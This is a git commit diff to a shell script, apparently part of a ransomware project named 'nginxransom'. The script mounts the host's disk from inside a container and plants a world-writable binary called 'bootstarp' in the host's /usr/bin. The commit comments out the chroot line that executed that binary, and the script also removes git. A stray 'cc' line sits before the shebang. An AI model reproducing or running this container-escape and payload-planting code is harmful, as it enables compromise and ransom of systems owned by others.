7c952348df8c41abc6a6dc36016d66a1a06f9b55
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-05-12 20:42:42 +0300

    bootstarp-5

--- volumefinder.sh
+++ volumefinder.sh
@@ -1,4 +1,4 @@
-c
+cc
 #!/bin/bash  
 
 #apt update -y 
@@ -9,6 +9,6 @@ cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
 cp -u /nginxransom/bootstarp.txt  /mnt/usr/bin/bootstarp && cp /nginxransom/bootstarp.txt /usr/bin/bootstarp && chmod 777 /usr/bin/bootstarp && chmod 777 /mnt/usr/bin/bootstarp 
-chroot /mnt/usr/bin/ ./bootstarp 
+#chroot /mnt/usr/bin/ ./bootstarp 
 apt remove git -y
 
